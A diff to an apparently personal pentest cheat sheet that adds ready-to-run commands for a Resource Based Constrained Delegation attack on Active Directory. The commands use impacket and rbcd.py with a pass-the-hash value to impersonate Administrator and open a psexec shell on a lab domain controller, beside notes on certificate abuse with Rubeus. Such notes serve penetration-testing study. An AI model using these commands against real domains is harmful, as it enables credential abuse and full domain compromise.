@@ -246,6 +246,22 @@ kali: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic 
 .\Rubeus.exe asktgt /user:administrator /certificate:C:\Users\Ryan.Cooper\Documents\cert.pfx /getcredentials /show /nowrap
 The result include administrator's hash
 ```
+#### Resource Based Constrained Delegation Attack 
+![image](https://github.com/user-attachments/assets/8a75dfbe-58a3-44a6-a962-dd34daf4b465)
+```
+impacket-addcomputer resourced.local/l.livingstone(:password) -dc-ip 192.168.x.x -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
+python3 rbcd.py -dc-ip 192.168.153.175 -t RESOURCEDC(hostname) -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
+impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.x.x
+```
+![image](https://github.com/user-attachments/assets/dbf59a75-11c3-4517-b0e7-60f5894aba5b)
+```
+export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
+
+Change resourcedc.resourced.local machin_ip_address in /etc/hosts
+
+impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
+```
+
 ### Authentication
 #### Minikatz(require local admin)
 Load DemoEXE and run it locally.  
